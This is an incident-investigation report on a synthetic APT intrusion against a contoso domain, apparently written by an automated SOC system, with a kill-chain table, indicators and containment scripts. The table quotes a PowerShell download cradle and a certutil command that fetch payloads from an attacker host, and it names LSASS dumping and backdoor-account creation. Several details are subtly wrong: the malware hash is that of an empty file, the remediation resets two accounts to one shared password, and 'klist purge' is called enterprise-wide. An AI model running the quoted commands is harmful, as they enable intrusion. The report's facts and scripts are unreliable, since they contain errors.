# Forensic Incident Investigation: APT Enterprise Intrusion & Lateral Movement
## Case: CASE-1-APT-ENTERPRISE-INTRUSION
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Domain:** `corp.contoso.com`  
**Primary Compromised Host:** `WKSTN-FIN-04.corp.contoso.com` (10.20.10.45)  
**Secondary Compromised Host (DC):** `DC01.corp.contoso.com` (10.20.10.10)  
**Threat Actor Infrastructure:** `185.220.101.45` (C2 / Staging), `203.0.113.119` (Phishing Mailer), `198.51.100.240` (Exfiltration Drop)  
**Assigned Fleet:** Case A: APT Enterprise Intrusion SOC Investigation Fleet  
**Status:** Completed · Multi-System Kill Chain Verified · Automated Containment Policies Enforced  
**Timestamp:** 2026-10-26T18:10:00Z  

---

### Executive Threat Summary
An advanced persistent threat (APT) multi-stage intrusion emulating APT29/UNC2452 was detected and reconstructed across disjointed log ecosystems (Cisco AsyncOS Email Gateway, Windows Security EVTX, Sysmon Operational XML, and Palo Alto Firewall CSV). 

The adversary established an initial foothold via a weaponized macro document (`Invoice_90214.docm`), executed an in-memory PowerShell cradle, staged secondary payloads via `certutil.exe`, dumped domain credentials from `lsass.exe` using Mimikatz, executed SMB lateral movement to primary Domain Controller `DC01`, and created a persistent rogue administrator account (`svc_backup_admin`). The actor exfiltrated 452.8 MB of proprietary financial archives to `198.51.100.240` while maintaining periodic 60-second jitterless heartbeat beaconing to `185.220.101.45:8443`.

Three co-mingled benign enterprise operations (marketing spam quarantine, native GPO `gpupdate.exe` refreshes, and legitimate OneDrive cloud sync) were accurately distinguished and discarded as non-malicious false positives.

---

### 1. Sequential 11-Stage Attack Kill Chain Reconstruction

| Stage # | MITRE ATT&CK | Timestamp (UTC) | Source Asset | Target Asset | User Account | Executable / Artifact | Command Line / Evidence | Severity |
|---|---|---|---|---|---|---|---|---|
| **Stage 1** | **T1566.001** Spearphishing Attachment | 2026-09-14 10:14:05 | `203.0.113.119` | `10.20.10.25` | `jdoe@contoso.com` | `Invoice_90214.docm` | Sender: `billing@overdue-invoices-center.org`, SHA256: `e3b0c442...b855` | **High** |
| **Stage 2** | **T1059.001** PowerShell Cradle | 2026-09-14 10:16:32 | `WKSTN-FIN-04` | `185.220.101.45:80` | `CONTOSO\jdoe` | `powershell.exe` | Parent: `WINWORD.EXE`. `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/cobalt.ps1')` | **Critical** |
| **Stage 3** | **T1105** Ingress Tool Transfer | 2026-09-14 10:17:45 | `WKSTN-FIN-04` | `185.220.101.45:80` | `CONTOSO\jdoe` | `certutil.exe` | `certutil.exe -urlcache -split -f http://185.220.101.45/stage2.dll C:\Users\Public\stage2.dll` | **High** |
| **Stage 4** | **T1003.001** LSASS Memory Access | 2026-09-14 10:20:14 | `WKSTN-FIN-04` | Local `lsass.exe` | `CONTOSO\jdoe` | `mimikatz.exe` | Sysmon Event 10. Target: `lsass.exe`, GrantedAccess: `0x1010` via `ntdll.dll` | **Critical** |
| **Stage 5** | **T1078.002** Explicit Credential Logon | 2026-09-14 10:22:15 | `WKSTN-FIN-04` | Local / `DC01` | `CONTOSO\da_admin` | `runas.exe` | Event 4648. Invoked explicit Domain Administrator token for `DC01.corp.contoso.com` | **High** |
| **Stage 6** | **T1021.002** SMB Lateral Movement | 2026-09-14 10:23:05 | `10.20.10.45` | `DC01` (`10.20.10.10`) | `CONTOSO\da_admin` | Kerberos / SMB | Event 4624 (Logon Type 3) & Event 4672 (`SeDebugPrivilege`, `SeImpersonatePrivilege`) | **Critical** |
| **Stage 7** | **T1569.002** Service Execution | 2026-09-14 10:23:18 | Remote `WKSTN-FIN-04` | `DC01` (`10.20.10.10`) | `LocalSystem` | `PSEXESVC.exe` | System Event 7045. Service `PSEXESVC` installed to `%SystemRoot%\PSEXESVC.exe` | **Critical** |
| **Stage 8** | **T1136.001** Backdoor Account Created | 2026-09-14 10:25:30 | `DC01` (`10.20.10.10`) | Local SAM / AD | `CONTOSO\da_admin` | `lsass.exe` / SAM | Event 4720. Target: `svc_backup_admin`, DisplayName: `Backup Automation Service` | **Critical** |
| **Stage 9** | **T1098** Privilege Escalation | 2026-09-14 10:25:32 | `DC01` (`10.20.10.10`) | Local SAM / AD | `CONTOSO\da_admin` | `lsass.exe` / SAM | Event 4732. Target: `Builtin\Administrators` (SID `S-1-5-32-544`), Member: `svc_backup_admin` | **Critical** |
| **Stage 10** | **T1071.001** C2 Heartbeat Beaconing | 2026-09-14 10:25:00 | `10.20.10.45` | `185.220.101.45:8443` | `CONTOSO\jdoe` | Network socket | Strict 60s periodic interval (10:25:00, 10:26:01, 10:27:00, 10:28:01, 10:29:00, 10:30:01) | **High** |
| **Stage 11** | **T1048.003** Exfiltration Over SSL | 2026-09-14 10:32:45 | `10.20.10.45` | `198.51.100.240:443` | `CONTOSO\jdoe` | Network socket | Palo Alto Traffic Log. 452.8 MB transferred in 145 seconds to foreign IP (`Seychelles`) | **Critical** |

---

### 2. Verified Indicators of Compromise (IOCs)

- **External C2 Server:** `185.220.101.45` (TCP/80 HTTP payload delivery, TCP/8443 TLS beaconing)
- **Exfiltration Drop IP:** `198.51.100.240` (TCP/443 SSL bulk transfer)
- **Phishing Mailer IP:** `203.0.113.119` (Sender: `billing@overdue-invoices-center.org`)
- **Weaponized Document:** `Invoice_90214.docm` (`SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`)
- **Downloaded Second-Stage DLL:** `C:\Users\Public\stage2.dll`
- **Rogue Persistence Service:** `PSEXESVC` (`%SystemRoot%\PSEXESVC.exe`)
- **Rogue Backdoor Account:** `svc_backup_admin` (Active Directory Domain User & Builtin Administrator)
- **Compromised User Identities:** `CONTOSO\jdoe`, `CONTOSO\da_admin`

---

### 3. False Positive Traps Successfully Discarded

1. **Trap 1: Benign Marketing Email (`MID 7401180` from `offers@enterprise-deals-weekly.biz`)**
   - Correctly assessed as routine marketing spam. No active exploit or macro attached. Score: 78.
2. **Trap 2: Routine Sysmon & Group Policy Activity (`gpupdate.exe /target:computer`, PID `0x18ac`)**
   - Correctly verified as native Windows Group Policy background client refresh under `NT AUTHORITY\SYSTEM`.
3. **Trap 3: Enterprise OneDrive Cloud Synchronization (`10.20.10.62` -> `13.107.136.9:443`)**
   - Correctly identified as benign Microsoft 365 cloud backup by employee `mjones` transmitting 385 MB under App-ID `ms-onedrive`.

---

### 4. Automated Containment & Remediation Policies

#### A. Perimeter Firewall Null-Route Commands (Palo Alto / Cisco ASA)
```bash
# Block C2 and exfiltration drop nodes immediately
set security-zone untrust address c2-staging-185 ip-netmask 185.220.101.45/32
set security-zone untrust address exfil-drop-198 ip-netmask 198.51.100.240/32
set security-zone untrust address phish-mailer-203 ip-netmask 203.0.113.119/32
set address-group c2-apt29-blocked member [ c2-staging-185 exfil-drop-198 phish-mailer-203 ]
set rulebase security rules "DROP-APT29-C2-TRAFFIC" from trust to untrust destination c2-apt29-blocked action drop log-start yes
commit
```

#### B. Active Directory Backdoor Account Remediation (PowerShell)
```powershell
# Remove rogue backdoor administrator and revoke Kerberos tickets
Import-Module ActiveDirectory
Remove-ADGroupMember -Identity "Administrators" -Members "svc_backup_admin" -Confirm:$false
Disable-ADAccount -Identity "svc_backup_admin"
Remove-ADUser -Identity "svc_backup_admin" -Confirm:$false

# Reset compromised Domain Administrator credentials
$newPassword = ConvertTo-SecureString -String (New-Guid).ToString("N") -AsPlainText -Force
Set-ADAccountPassword -Identity "da_admin" -NewPassword $newPassword -Reset
Set-ADAccountPassword -Identity "jdoe" -NewPassword $newPassword -Reset

# Purge Kerberos TGT and TGS tickets enterprise-wide
klist purge
```

#### C. Endpoint Containment & Service Removal
```powershell
# Isolate primary workstation and terminate C2 beaconing
New-NetFirewallRule -DisplayName "EDR-QUARANTINE-IN" -Direction Inbound -Action Block -Profile Any
New-NetFirewallRule -DisplayName "EDR-QUARANTINE-OUT" -Direction Outbound -Action Block -Profile Any

# Stop and delete rogue PsExec service on DC01
sc.exe \\DC01.corp.contoso.com stop PSEXESVC
sc.exe \\DC01.corp.contoso.com delete PSEXESVC
Remove-Item -Path "\\DC01.corp.contoso.com\C$\Windows\PSEXESVC.exe" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Users\Public\stage2.dll" -Force -ErrorAction SilentlyContinue
```
